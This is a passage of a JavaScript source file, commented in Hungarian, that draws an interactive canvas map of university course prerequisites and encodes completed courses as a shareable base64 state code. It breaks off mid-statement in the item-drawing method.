/**
 * Copyright 2012 József Sebestyén aka Szalonna
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Public source page: https://github.com/szalonna/OE-Dependecy-Map
 *
 */

/**
 * GraphDrawer osztály
 *
 * @class GraphDrawer
 * @param {Object} container Tartalmazó div
 * @constructor
 */
var GraphDrawer = function(container){

	/**
	 * Alap beállítások.
	 */
	var Prefs = {
		item: {
			font: 		   "bold 10px Arial",	// Betűstílus
			lineHeight:    12,					// Sormagasság
			lineOffset:    2,					// Sorok közötti távolság
			maxTextLength: 110,					// Max szövegszélesség
			padding:       5,					// Padding a négyszög széleitől
			margin: 	   5,					// Két négyszög közötti távolás
			height: 	   56,					// Minimális négyszögmagasság
			cornerRadius:  5,					// Sarok lekerekítés sugara
		},
		column: {
			margin: 10 					// Oszlopok közötti távolság
		},

		/*
		 * Jelenleg ki van kapcsolva a kapcsolatok kirajzolása
		 */
	
		// connection: {
		// 	color: "rgba(0,0,0,0.1)",	// Kapcsolatok színe
		// 	width: 1 					// Kapcsolatok vonalvastagsága
		// },
		container: {
			fitHeight: true				// Automatikus magasságméretezés engedélyezése
		},
		colors: {
			"normal":     "#478aa2",	// Normál állapotú elemek háttérszíne
			"completted": "#45358F",	// Teljesített elemek háttérszíne
			"canjoin":    "#79C900",	// Teljesíthető elemek háttérszíne
			"highlight":  "#FFFFFF",	// Kiemelt elemek háttérszíne
			//"hovered":    "#c43108",	// Egér alatt lévő elem háttérszíne
			"pendent":    "#c43108"     // Egér alatt lévő elemtől függő elemek háttérszíne
		},
		canvas: {
			padding: 5 					// Vászon széle és elem közötti távolság
		}
	};

	// ==================================================================== //

	/**
	 * Base64 alapú kódoló- és dekódoló osztály.
	 * 
	 * @class Base64Class
	 * @construnctor
	 */
	var Base64Class = function(){

		var keyStr = "HZALONEUMBCDFGSv"  +  // Karakterkészlet
	            	 "VQRTWXY0cdfIJrPt"  +
	                 "szaloneu+g7hijkpq" +
	                 "wxyb123456m89/="   +
	                 "K";

	    /**
	     * Kódoló metódus. Szokványos base64 kódoló algoritmus.
	     * 
	     * @method encode
	     * @param {String} input Kódolatlan szöveg
	     * @return {String} Kódolt szöveg
	     */
	  	this.encode = function(input) {
	    	input = escape(input);
	    	var output = "",
	    		chr1, chr2, chr3 = "",
	    		enc1, enc2, enc3, enc4 = "",
	    		i = 0;

			do {
	        	chr1 = input.charCodeAt(i++);
	        	chr2 = input.charCodeAt(i++);
	        	chr3 = input.charCodeAt(i++);

	        	enc1 = chr1 >> 2;
	        	enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
	        	enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
	        	enc4 = chr3 & 63;

	        	if (isNaN(chr2)) {
	           		enc3 = enc4 = 64;
	        	} else if (isNaN(chr3)) {
	           		enc4 = 64;
	        	}

	        	output = output +
	        			 keyStr.charAt(enc1) +
	        			 keyStr.charAt(enc2) +
	        			 keyStr.charAt(enc3) +
	        			 keyStr.charAt(enc4);
	        
	        	chr1 = chr2 = chr3 = "";
	        	enc1 = enc2 = enc3 = enc4 = "";
	     	} while (i < input.length);

	    	return output;
	 	}

	 	/**
	 	 * Dekódoló metódus. Szokványos base64.
	 	 *
	 	 * @method decode
	 	 * @param {String} input Kódolt karaktersorozat
	 	 * @return {String} Dekódolt karaktersorozat
	 	 */
		this.decode = function(input) {
	    	var output = "";
	    	var chr1, chr2, chr3 = "";
	    	var enc1, enc2, enc3, enc4 = "";
	    	var i = 0;

	    	var base64test = /[^A-Za-z0-9\+\/\=]/g;
	    	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

	    	do{
	        	enc1 = keyStr.indexOf(input.charAt(i++));
	        	enc2 = keyStr.indexOf(input.charAt(i++));
	        	enc3 = keyStr.indexOf(input.charAt(i++));
	        	enc4 = keyStr.indexOf(input.charAt(i++));

	    		chr1 = (enc1 << 2) | (enc2 >> 4);
	    		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
	    		chr3 = ((enc3 & 3) << 6) | enc4;
	        	
	        	output = output + String.fromCharCode(chr1);

		        if (enc3 != 64) {
		           output = output + String.fromCharCode(chr2);
		        }

		        if (enc4 != 64) {
		           output = output + String.fromCharCode(chr3);
		        }

				chr1 = chr2 = chr3 = "";
				enc1 = enc2 = enc3 = enc4 = "";
	     	} while (i < input.length);

			return unescape(output);
		}

	}

	// ==================================================================== //

	/**
	 * Alap rajzolási metódusokat tartalmazó osztály.
	 * 
	 * @class Drawer
	 * @param {CanvasRenderingContext2D} ctx Canvas 2D kontextus
	 * @construnctor
	 */
	var Drawer = function(ctx){

		/**
		 * Lekerekített sarkú négyszög rajzolása.
		 *
		 * @method roundRect
		 * @param {Object} startPoint Kezdőpont (bal felső sarok), például {x: 10, y: 20}
		 * @param {Object} size Négyszög mérete, például {width: 100, height: 120}
		 * @param {Integer} [radius=5] Lekerekítés mérete
		 * @param {Integer} [offset=0] Az eredeti méretekhez képesti eltérés mértéke (középponzos eltérés)
		 */
		this.roundRect = function(startPoint, size, radius, offset) {
			if (typeof radius === "undefined") {
				radius = 5;							// Ha nem adtak meg radiust, akkor legyen 5.
			}

			if(typeof offset == "undefined"){
				offset = 0;							// Ha nem adtak meg offset-et, akkor legyen 0.
			}

			ctx.beginPath();

			ctx.moveTo(startPoint.x + offset + radius, startPoint.y + offset);

			ctx.lineTo(startPoint.x + size.width - radius - offset, startPoint.y + offset);
			ctx.quadraticCurveTo(startPoint.x + size.width - offset, startPoint.y + offset, startPoint.x + size.width - offset, startPoint.y + radius + offset);

			ctx.lineTo(startPoint.x + size.width - offset, startPoint.y + size.height - radius - offset);
			ctx.quadraticCurveTo(startPoint.x + size.width - offset, startPoint.y + size.height - offset, startPoint.x + size.width - radius - offset, startPoint.y + size.height - offset);

			ctx.lineTo(startPoint.x + radius + offset, startPoint.y + size.height - offset);
			ctx.quadraticCurveTo(startPoint.x + offset, startPoint.y + size.height - offset, startPoint.x + offset, startPoint.y + size.height - radius - offset);

			ctx.lineTo(startPoint.x + offset, startPoint.y + radius + offset);
			ctx.quadraticCurveTo(startPoint.x + offset, startPoint.y + offset, startPoint.x + radius + offset, startPoint.y + offset);

			ctx.closePath();
	   	}

	   	/**
	   	 * Két pont közötti íves vonal rajzoló metódus.
	   	 *
	   	 * @method drawConnection
	   	 * @param {Object} startPoint Kezdőpont, például {x: 10, y: 20}
	   	 * @param {Object} stopPoint Végpont, például {x: 30, y: 50}
	   	 * @param {Integer} leveldiff Szinteltérés
	   	 */
		this.drawConnection = function(startPoint, stopPoint, leveldiff){
			
			ctx.strokeStyle = Prefs.connection.color;
			ctx.lineWidth   = Prefs.connection.width;

			ctx.beginPath();
			ctx.moveTo(
				startPoint.x,
				startPoint.y
			);

			if(leveldiff != 0){			// Ha eltérő szinten találhatóak az elemek, akkor...
				ctx.bezierCurveTo(
					startPoint.x + Math.abs((stopPoint.x - startPoint.x) / 2),
					startPoint.y,
					startPoint.x + Math.abs((stopPoint.x - startPoint.x) / 2),
					stopPoint.y,
					stopPoint.x,
					stopPoint.y
				);
			}else{						// Ha azonos szinten vannak az elemek, akkor...
				ctx.bezierCurveTo(
					startPoint.x,
					startPoint.y,
					stopPoint.x - 2*Prefs.column.margin,
					stopPoint.y - Math.abs((stopPoint.y - startPoint.y) / 2),
					stopPoint.x,
					stopPoint.y
				);
			}

			ctx.stroke();
			ctx.closePath();
		}

		/**
		 * Szövegszélesség kalkuláció.
		 *
		 * @method measureText
		 * @param {String} text Szöveg
		 * @param {String} fontStyle Betűstílus
		 * @return {Integer} Szöveg szélessége
		 */
		this.measureText = function(text, fontStyle){
			ctx.font = fontStyle;
			return ctx.measureText(text).width;
		}

		/**
		 * Szín normalizálása #rrggbb formátumra.
		 *
		 * @method normalizeHex
		 * @param {String} color Szín, lehet rövid és hosszú hexa, rgb és rgba.
		 * @return Hosszú formáju hexa
		 */
		this.normalizeHex = function(color){
			if(color.substring(0,3) == "rgb"){							// RGB v RGBA lett megadva

				var offset = color[3] == "a" ? 1 : 0,					// Ha a negyedik karakter A, beállítunk egy eltolást
					vals   = color.split(","),							// Vesszőknél felbontjuk a szót
					r = parseInt(vals[0].trim().substr(4 + offset, 3)), // Levágjuk az RGB(A) részt
					g = parseInt(vals[1]),
					b = parseInt(vals[2]);
				
				/**
				 * Integert alakít hexa kóddá, vezető nullával
				 *
				 * @method intToHex
				 * @param {Integer} integer Konvertálandó szám
				 * @return {String} Hexa érték
				 */
				var intToHex = function(integer){
					var hex = "0" + integer.toString(16);
					return hex.substr(hex.length - 2, 2);
				}

				return "#" + intToHex(r) + intToHex(g) + intToHex(b);

 			}else if(color[0] == "#"){

 				if(color.length == 4){									// Ha a hexa kód 4 karakter hosszú, úgy rövidített verzió
 					return "#" +
 						   color[1] + color[1] +
 						   color[2] + color[2] +
 						   color[3] + color[3];	
 				}

 				return color;
 			}
		}

		/**
		 * Szín világosságának kalkulációja.
		 *
		 * @method colorBrightness
		 * @param {String} color Szín
		 * @return {Integer} Fényesség érték
		 */
		this.colorBrightness = function(color){
			color = this.normalizeHex(color);

			var r = parseInt(color.substr(1, 2), 16),
		        g = parseInt(color.substr(3, 2), 16),
	    	    b = parseInt(color.substr(5, 2), 16);
	    	return (0.2126*r) + (0.7152*g) + (0.0722*b);				// http://en.wikipedia.org/wiki/Luminance_%28relative%29
		}

		/**
		 * Hexa színkód RGBA-vá alakítása a megadott áttetszőséggel.
		 *
		 * @method hex2rgba
		 * @param {String} hex Hexa színkód
		 * @param {Integer} [opacity=1] Áttetszőség érték (0-1 közötti érték)
		 * @return {String} RGBA színkód
		 */
		this.hex2rgba = function(hex, opacity){
			if(opacity == undefined){
				opacity = 1;				// Ha nincs opacity beállítva, legyen 1.
			}

			hex = this.normalizeHex(hex);

			var red   = parseInt(hex.substring(1,3),16),
				green = parseInt(hex.substring(3,5),16),
				blue  = parseInt(hex.substring(5,7),16);
			return "rgba("+red+","+green+","+blue+","+opacity+")";
		}
	}

	// ==================================================================== //

	/**
	 * Elemek és kapcsolatai kezelése
	 * 
	 * @class ItemHandler
	 * @construnctor
	 */
	var ItemHandler = function(){
		var items       = new Array(),			// Tárgyak listája
			connections = new Array(),			// Kapcsolatok listája
			columns     = new Array(),			// Oszlopok listája
			cache       = new Array(),			// Gyorsítótár
			base64      = new Base64Class();	// Kódoló példány

		/**
		 * Elem hozzáadása a listához.
		 * Elem minimális felépítése:
		 *
		 * var item = {
		 *	 "id": "elem azonosító",
		 *   "name": "elem neve",
		 *   "kredit": "kreditérték",
		 *   "level": "félév"
		 * };
		 *
		 * @method addItem
		 * @param {Object} item Elem, amit hozzá kívánunk adni
		 */
		this.addItem = function(item){
			if(this.getItemById(item.id) != undefined){		// Ha már szerepel az elem a listában, nem csinálunk semmit sem.
				return;
			}

			/**
			 * Ki kell számolni az elem méreteit. Szélessége fix, magassága az elem nevétől
			 * függ. Fel kell bontani a nevet sorokra, majd ennek kiszámolni a magasságát.
			 */

			var words  = item.name.split(" "),				// Felbontjuk a nevet a szóközök mentén.
				text   = new Array(),						// A szöveg sorokra bontva lesz benne.
				t_text = "";								// Átmeneti változó

			ctx.font = Prefs.item.font;

			var length = words.length;
			for(var i = 0; i < length; i++){
				if(drawer.measureText(t_text + words[i]) <= Prefs.item.maxTextLength ||  // Ha az átmeneti változóban tárolt szöveg kisebb vagy egyenlő, mint a megengedett,
				   i == 0){																 // vagy első szó, akkor
					if(t_text.length > 0){												 // ha már tartalmaz szöveget az átmeneti változó
						t_text += " ";													 // hozzáfűzűnk egy szóközt, majd
					}
					t_text += words[i];													 // hozzáfűzzük az aktuális részletet.
				}else{
					text.push(t_text);													 // Egyébként a gyűjtőtömbbe hozzáadjuk, mint új sor, és folytatjuk.
					t_text = words[i];
				}
			}
			text.push(t_text);															 // Utolsó részletet hozzáadjuk a szöveghez.
			var calcheight = (text.length + 1) *
			                 (Prefs.item.lineHeight + Prefs.item.lineOffset);			 // Elem magasságának számítása (a +1 a kredit kiíró sor miatt kell)

			/**
			 * Minden oszlopról eltároljuk, hogy a következő elem milyen pontokba kerüljön. Ezeket
			 * az adatokat a columns tömb tárolja.
			 */

			if(columns[item.level] == undefined){										// Ha még nincs erről az oszlopról adatunk, alapértelmezett adatokat generálunk.
				columns[item.level] = {
					x: (item.level - 1)*(Prefs.item.maxTextLength + Prefs.column.margin + 2*Prefs.item.padding + Prefs.item.margin) + Prefs.item.margin + Prefs.canvas.padding,
					y: Prefs.canvas.padding
				};
			}

			item.properties = {															// Bővítjük az elemünket a következő adatokkal:
				status: "canjoin",														// Elem állapota (fel lehet venni, teljesített, ...)
				highlight: false,														// Kiemelt elem-e
				hovered: false,															// Egér alatt álló elem-e
				forced: false,															// Kényszerített kijelölés
				text: text,																// Sorokra felbontott név
				position: {																// Elem pozíciója (bal felső sarok)
					x: columns[item.level].x,
					y: columns[item.level].y
				},
				size: {																	// Elem mérete (szélesség, magasság)
					width: Prefs.item.maxTextLength + 2*Prefs.item.padding,
					height: calcheight + 2*Prefs.item.padding
				},
				pendent: false
			}
			items.push(item);															// Elem eltárolása

			columns[item.level].y += Prefs.item.margin + item.properties.size.height;	// Elem oszlopának 
		}

		/**
		 * Kapcsolat hozzáadása. Az első elem függ a másodiktól.
		 *
		 * @method addConnection
		 * @param {String} id1 Elem azonosító 1
		 * @param {String} id2 Elem azonosító 2
		 */
		this.addConnection = function(id1, id2){
			var item1 = this.getItemById(id1),
				item2 = this.getItemById(id2);

			if(item1 != undefined && item2 != undefined){			// Ha a két elem létezik
				if(item1.level < item2.level){						// és azok szintje fordított, megcseréljük őket, majd
					t     = item1;
					item1 = item2;
					item2 = t;
				}

				if(connections[item1.id] ==  undefined){			// ha még nincs az első elemnek függőséges,
					connections[item1.id] = new Array();			// akkor létrehozzuk a kapcsolatok tárolására a tömböt,
					item1.properties.status = "normal";				// majd 'canjoin'-ról 'normal'-ra állítjuk az állapotát
				}
				if(connections[item1.id].indexOf(item2.id) == -1){  // Ha még nincs eltárolva a kapcsolat, eltároljuk.
					connections[item1.id].push(item2.id);
				}
			}
		}

		/**
		 * Elemek listájának lekérdezése
		 * 
		 * @method getItems
		 * @return {Array} Elemek listája
		 */
		this.getItems = function(){

			return items;
		}

		/**
		 * Kapcsolatok listájának visszaadása
		 * 
		 * @method getConnections
		 * @return {Array} Kapcsolatok listája
		 */
		this.getConnections = function(){

			return connections;
		}

		/**
		 * Elem visszaadása azonosító alapján
		 *
		 * @method getItemById
		 * @param {String} id Elem azonosító
		 * @return {Object} Elem vagy undefined
		 */
		this.getItemById = function(id){
			var length = items.length;
			for (var i = 0; i < length; i++) {
				if(items[i].id == id){
					return items[i];
				}
			}
			return undefined;
		}

		/**
		 * Kapcsolatok kezdő és végpontjainak listájának lekérdezése
		 *
		 * @method getConnectionPoints
		 * @return {Array} Kapcsolati pontok listája
		 */
		this.getConnectionPoints = function(){
			if(cache["connectionPoints"] == undefined){
				var points = new Array();

				var length = items.length;
				for(var i = 0; i < length; i++){
					if(connections[items[i].id] != undefined){
						startPoint = items[i].properties.position;

						var connectionslength = connections[items[i].id].length;
						for(var j = 0; j < connectionslength; j++){
							points.push({
								startPoint: startPoint,
								endPoint:   this.getItemById(connections[items[i].id]).properties.position
							})
						}
					}
				}
				cache["connectionPoints"] = points;
			}

			return cache["connectionPoints"];
		}

		/**
		 * Ellenőrzi, hogy az adott elemhez van-e már eltárolt érték. Ha nincs,
		 * létrehoz egy üres helyet neki.
		 *
		 * @method checkCache
		 * @param {String} id Elem azonosító
		 */
		this.checkCache = function(id){
			if(cache[id] == undefined){
				cache[id] = new Array();
			}
		}

		/**
		 * Elem előzményeinek lekérdezése
		 *
		 * @method getRoots
		 * @param {String} id Elem azonosító
		 * @return {Array} Elemek listája
		 */
		this.getRoots = function(id){
			this.checkCache(id);

			if(cache[id]["roots"] == undefined){
				var roots = new Array();
				if(connections[id] != undefined){
					for (var j = 0; j < connections[id].length; j++) {
						roots.push(this.getItemById(connections[id][j]));
					};
				}
				cache[id]["roots"] = roots;
			}
			return cache[id]["roots"];
		}

		/**
		 * Elemre épülő tárgyak lekérdezése
		 *
		 * @method getFollows
		 * @param {String} id Elem azonosító
		 * @return {Array} Elemek listája
		 */
		this.getFollows = function(id){
			this.checkCache(id);

			if(cache[id]["follows"] == undefined){
				var follows = new Array(),
					length  = items.length;

				for (var i = 0; i < length; i++) {
					if(connections[items[i].id] != undefined && connections[items[i].id].indexOf(id) > -1){
						follows.push(items[i]);
					}
				};
				cache[id]["follows"] = follows;
			}
			return cache[id]["follows"];
		}

		/**
		 * Ráépülők gyűjtőmetódusa. Rekurzív.
		 *
		 * @method pendentCollector
		 * @param {String} id Elem azonosító
		 * @param {Array} arr Ráépülőket gyűjtő tömb
		 */
		this.pendentCollector = function(id, arr){
			var follows = this.getFollows(id);

			if(arr.indexOf(id) == -1){
				arr.push(id)								// Ha az aktuális elem nincs a listában, hozzáadjuk.
			}

			for(var i = 0; i < follows.length; i++){
				this.pendentCollector(follows[i].id, arr);  // Rekurzívan meghívjuk a közvetlen ráépülőkre.
			}
		}

		/**
		 * Elem ráépülőinek kigyűjtése.
		 *
		 * @method getPendents
		 * @param {String} id Elem azonosító
		 * @return {Array} Ráépülők listája
		 */
		this.getPendents = function(id){
			this.checkCache(id);

			if(cache[id]["pendents"] == undefined){
				var pendents = new Array();
					follows  = this.getFollows(id),
					length   = follows.length;

				for (var i = 0; i < length; i++){
					this.pendentCollector(follows[i].id, pendents);
				};
				cache[id]["pendents"] = pendents;
			}

			return cache[id]["pendents"];
		}

		/**
		 * Egérmutató alatti elem visszaadása
		 * 
		 * @method getHoveredItem
		 * @param {Object} mouse Egér pozíciójának canvas-hoz képest relatív koordinátái, például {x: 100, y: 110}
		 * @return {Object} Egér alatti elem
		 */
		this.getHoveredItem = function(mouse){
			var item   = undefined,
				length = items.length;

			for(var i = 0; i < length; i++){
				if(
					items[i].properties.position.x <= mouse.x &&
					items[i].properties.position.y <= mouse.y &&
					items[i].properties.position.x + items[i].properties.size.width >= mouse.x &&
					items[i].properties.position.y + items[i].properties.size.height >= mouse.y
				){
					item = items[i];
					if(!items[i].properties.hovered){
						items[i].properties.hovered = true;
						EventBus.dispatch("clearHighlights", this);
						EventBus.dispatch("redrawItem", this, items[i].id);
					}
				}else if(items[i].properties.hovered){
					items[i].properties.hovered = false;
					EventBus.dispatch("redrawItem", this, items[i].id);
				}
			}

			if(item == undefined){
				EventBus.dispatch("clearCursor", this);
			}
			return item;
		}

		/**
		 * Elem állapotának megállapítása a függőségei és aktuális állapota alapján
		 *
		 * @method getStatus
		 * @param {String} id Elemazonosító
		 * @return {String} Elem állapota
		 */
		this.getStatus = function(id){
			var item = this.getItemById(id);

			if(item == undefined){
				return;
			}

			if(item.properties.forced){
				return "completted";
			}

			var rootsOkay = this.isNextRootsFinished(id);

			if(rootsOkay){
				if(item.properties.status == "completted"){
					return "completted";
				}else{
					return "canjoin";
				}
			}
			return "normal";
		}

		/**
		 * Elem közvetlen ősei teljesítettek-e
		 *
		 * @method isNextRootsFinished
		 * @param {String} id Elemazonosító
		 * @return {Boolean} Igaz, ha az ősök már teljesítettek
		 */
		this.isNextRootsFinished = function(id){
			var allroots = this.getRoots(id);
			for(var i = 0; i < allroots.length; i++){
				if(allroots[i].properties.status != "completted"){
					return false;
				}
			}
			return true;
		}

		/**
		 * "Hover" állapot megszűntetése.
		 *
		 * @method clearHover
		 */
		this.clearHover = function(){
			var length = items.length;
			for(var i = 0; i < length; i++){
				if(items[i].properties.hovered){
					items[i].properties.hovered = false;
					return;
				}
			}
		}

		/**
		 * Gráf magasságának kiszámítása.
		 *
		 * @method getGraphSize
		 * @return {Integer} A megjelenítéshez szükséges magasság pixelben.
		 */
		this.getGraphSize = function(){
			var width  = 0,
				height = 0,
				length = columns.length;

			for(var i = 0; i < length; i++){
				if(columns[i] == undefined){
					continue;
				}

				if(width < columns[i].x){
					width = columns[i].x;
				}

				if(height < columns[i].y){
					height = columns[i].y;
				}
			}

			size = {
				width:	width + Prefs.item.maxTextLength + Prefs.column.margin + Prefs.item.padding,
				height: height
			}
			return size;
		}

		/**
		 * Aktuálisan bejelölt állapot kódjának előállítása.
		 *
		 * @method serialize
		 * @return {String} Állapotkód
		 */
		this.serialize = function(){
			
			var toserialize = new Array(),
				length      = items.length;

			for(var i = 0; i < length; i++){
				if(items[i].properties.status == "completted"){
					toserialize.push(items[i]);
				}
			}

			for(var j, x, i = toserialize.length; i; j = parseInt(Math.random() * i), x = toserialize[--i], toserialize[i] = toserialize[j], toserialize[j] = x);

			var seri   = "",
				length = toserialize.length;

			for(var i = 0; i < length; i++){
				if(seri.length > 1){
					seri += "|";
				}
				seri += toserialize[i].id;
			}
			return base64.encode(seri);
		}

		/**
		 * Állapotkód alapján visszaállítás.
		 *
		 * @method unserialize
		 * @param {String} data Állapotkód
		 */
		this.unserialize = function(data){
			
			var decoded = base64.decode(data).split("|"),
				length  = decoded.length;

			for(var i = 0; i < length; i++){
				if(this.getItemById(decoded[i]) == undefined) return;
			}

			for(var i = 0; i < length; i++){
				this.getItemById(decoded[i]).properties.status = "completted";
			}

			this.refresh();

			for(var i = 0; i < length; i++){
				var item = this.getItemById(decoded[i]);
				if(item.properties.status != "completted"){
					item.properties.status = "completted";
					item.properties.forced = true;
				}
			}

			EventBus.dispatch("redrawAll", this);
		}

		/**
		 * Elemek állapotának frissítése.
		 *
		 * @method refresh
		 */
		this.refresh = function(){
			var level    = 0,
			    updated  = false,
			    sumfound = 0;

			do{
				updated = false;
				var foundItems = 0;

				for(var i = 0; i < items.length; i++){
					if(items[i].level == level){
						foundItems++;
						items[i].properties.status = this.getStatus(items[i].id);
					}
				}

				sumfound += foundItems;
				if(sumfound < items.length){
					level++;
					updated = true;
				}
			}while(updated);
		}

		/**
		 * Adatok ürítése
		 *
		 * @method clear
		 */
		this.clear = function(){
			items       = [];
			connections = [];
			columns     = [];
			cache       = [];
		}

		/**
		 * Összeállítás törlése, alapállapot helyreállítása.
		 *
		 * @method clearSelection
		 */
		this.clearSelection = function(){
			for(var i = 0, length = items.length; i < length; i++){
				items[i].properties.status = "normal";
			}

			this.refresh();
		}
	}

	// ==================================================================== //

	var canvas    = container.appendChild(document.createElement("canvas")),	// Létrehozunk egy canvast az átadott div-ben
		ctx	      = canvas.getContext("2d"),									// A létrehozott canvas 2D kontextusa
		drawer    = new Drawer(ctx),											// Rajzoló példány
		items     = new ItemHandler(),											// Elem kezelő példány
		coder     = new Base64Class();											// Kódoló-dekódoló példány
		currentID = "";

	container.style.overflow = "auto";										// Tartalmazó div scrollok auto-ra állítása

	if(typeof(ctx.mozImageSmoothingEnabled) == "boolean"){					// Ha van canvas smoothing, bekapcsoljuk
		ctx.mozImageSmoothingEnabled = true;
	}

	/**
	 * Localstorage fallback implementation
	 *
	 * Source: https://developer.mozilla.org/en-US/docs/DOM/Storage
	 */
	if (!window.localStorage) {
		window.localStorage = {
			getItem: function (sKey) {
				if (!sKey || !this.hasOwnProperty(sKey)) { return null; }
				return unescape(document.cookie.replace(new RegExp("(?:^|.*;\\s*)" + escape(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*((?:[^;](?!;))*[^;]?).*"), "$1"));
			},
			key: function (nKeyId) {
				return unescape(document.cookie.replace(/\s*\=(?:.(?!;))*$/, "").split(/\s*\=(?:[^;](?!;))*[^;]?;\s*/)[nKeyId]);
			},
			setItem: function (sKey, sValue) {
				if(!sKey) { return; }
				document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
				this.length = document.cookie.match(/\=/g).length;
			},
			length: 0,
			removeItem: function (sKey) {
				if (!sKey || !this.hasOwnProperty(sKey)) { return; }
				document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
				this.length--;
			},
			hasOwnProperty: function (sKey) {
				return (new RegExp("(?:^|;\\s*)" + escape(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
			}
		};
		window.localStorage.length = (document.cookie.match(/\=/g) || window.localStorage).length;
	}

	/**
	 * Egérmozgás esemény kezelése
	 */
	canvas.onmousemove = function(e){
		e.stopPropagation();

		if(this.lastMove == undefined || (new Date()).getTime() - this.lastMove > 100){
			this.lastMove = (new Date()).getTime();

			if (e.offsetX != undefined) {
			    var mousePoint = {
			        x: e.offsetX,
			        y: e.offsetY
			    }
			} else {
			    var mousePoint = {
			        x: e.layerX,
			        y: e.layerY
			    }
			}

			var hoveredItem = items.getHoveredItem(mousePoint);
			if(hoveredItem != undefined){
				EventBus.dispatch("hoveredEvent", this, hoveredItem);
			}
		}
	}

	canvas.onmouseleave = function(e){
		EventBus.dispatch("clearHighlights", this);
		EventBus.dispatch("clearCursor", this);
	}

	/**
	 * Kattintás esemény kezelése
	 */
	canvas.onclick = function(e){

		if(typeof(e.stopImmediatePropagation) == "function"){
		    e.stopImmediatePropagation();
		}
		if(typeof(e.stopPropagation) == "function"){
		    e.stopPropagation();
		}

	    if (e.offsetX != undefined) {
	        var mousePoint = {
	            x: e.offsetX,
	            y: e.offsetY
	        }
	    } else {
	        var mousePoint = {
	            x: e.layerX,
	            y: e.layerY
	        }
	    }

		var clicked = items.getHoveredItem(mousePoint);
		if(clicked == undefined ){
			return;	
		}
		if(clicked.properties.status == "canjoin" || clicked.properties.status == "normal" && e.ctrlKey){

			if(e.ctrlKey){
				clicked.properties.forced = "true";
			}
	
			clicked.properties.status = "completted";
			EventBus.dispatch("redrawItem", this, clicked.id);

			var follows = items.getFollows(clicked.id);
			var length = follows.length;
			for(var i = 0; i < length; i++){
				
				follows[i].properties.status = items.getStatus(follows[i].id);
				
				EventBus.dispatch("redrawItem", this, follows[i].id);
			}
		}else if(clicked.properties.status == "completted"){
			if(clicked.properties.forced){
				clicked.properties.forced = false;
				
				clicked.properties.status = items.getStatus(clicked.id);
				
			}else{
				clicked.properties.status = "canjoin";
			}
			EventBus.dispatch("clearFollows", this, clicked.id);
			EventBus.dispatch("redrawItem", this, clicked.id);
		}

		var clone = JSON.parse(JSON.stringify(clicked));
		delete clone.properties;
		clone.selected = clicked.properties.status == "completted" ? true : false;
		EventBus.dispatch("publicClickEvent", this, clone, e);
	}

	/**
	 * Elem hozzáadása metódus.
	 *
	 * @method addItem
	 * @param {Object} itemDesc Hozzáadandó elem.
	 */
	this.addItem = function(itemDesc){
	
		items.addItem(itemDesc);
	}

	/**
	 * Kapcsolat hozzáadása.
	 *
	 * @method addConnection
	 * @param {String} id1 Egyik elem azonosító
	 * @param {String} id2 Másik elem azonosító
	 */
	this.addConnection = function(id1, id2){

		items.addConnection(id1, id2);
	}

	/**
	 * Elem lekérdezése
	 * 
	 * @method getItem
	 * @param {String} id Azonosító
	 * @return {Object} Keresett elem vagy "undefined"
	 */
	this.getItem = function(id){
	
		return items.getItemById(id);
	}

	/**
	 * Elem kirajzolása
	 *
	 * @method drawItem
	 * @param {String} id Elem azonosítója
	 */
	this.drawItem = function(id){
		var item = items.getItemById(id);

		ctx.clearRect(item.properties.position.x, item.properties.position.y, item.properties.size.width, item.properties.size.height);

		var bgcolor;

		drawer.roundRect(
			item.properties.position,
			item.properties.size,
			Prefs.item.cornerRadius
		);

		if(item.properties.hovered){
			bgcolor = Prefs.colors[item.properties.status];
			canvas.style.cursor = "pointer";
		} else if(item.properties.highlight){
			bgcolor = Prefs.colors["highlight"];
		} else if(item.properties.pendent){
			bgcolor = Prefs.colors["pendent"];
		} else {
			bgcolor = Prefs.colors[item.properties.status];
		}
		
		ctx.fillStyle = bgcolor;
		ctx.fill();

		if(item.properties.highlight){
			var linewidth = 2;

			drawer.roundRect(
				item.properties.position,
				item.properties.size,
				Prefs.item.cornerRadius - linewidth / 2,
				linewidth / 2
			);

			ctx.strokeStyle = Prefs.colors[item.properties.status];
			ctx.lineWidth = linewidth;
			ctx.stroke();
		}

		if(items.getFollows(item.id).length == 0){
			var ending = ctx.createLinearGradient(item.properties.position.x + (2*item.properties.size.width / 3), item.properties.position.y,
												  item.properties.position.x + item.properties.size.width, item.properties.position.y);

			ending.addColorStop(.85, "rgba(0,0,0,0)");
			ending.addColorStop(.85, "rgba(0,0,0,.5)");
			ending.addColorStop( 1,  "rgba(0,0,0,.5)");

			ctx.fillStyle = ending;
			ctx.fill();
		}

		ctx.font	  = Prefs.item.font;
		ctx.textAlign = "center";

		var fontMainColor, fontBgColor, offset;

		if(drawer.colorBrightness(bgcolor) > 128){
			fontMainColor = "#222";
			fontBgColor	  = "rgba(255,255,255,.5)";
			offset        = 1;
		}else{
			fontMainColor = "#fff";
			fontBgColor   = "rgba(0,0,0,.5)";
			offset        = -1;
		}

		/**
		 * Elem szövegének kirajzolása adott színnel és elcsúsztatással.
		 *
		 * @method drawText
		 * @param {String} color Színkód
		 * @param {Integer} offset Függőleges elcsúsztatás
		 */
		var drawText = function(color, offset){
			ctx.fillStyle = color;
			var length    = item.properties.text.length;
			for(var i = 0; i < length; i++){
				ctx.fillText(
					item.properties.text[i],
					item.properties.position.x + item.properties.size.width / 2,
					item.properties.position.y + offset + (i+1)*(Prefs.item.lineHeight + Prefs.item.lineOffset));
			}
			ctx.fillText(item.kredit + " kredit",
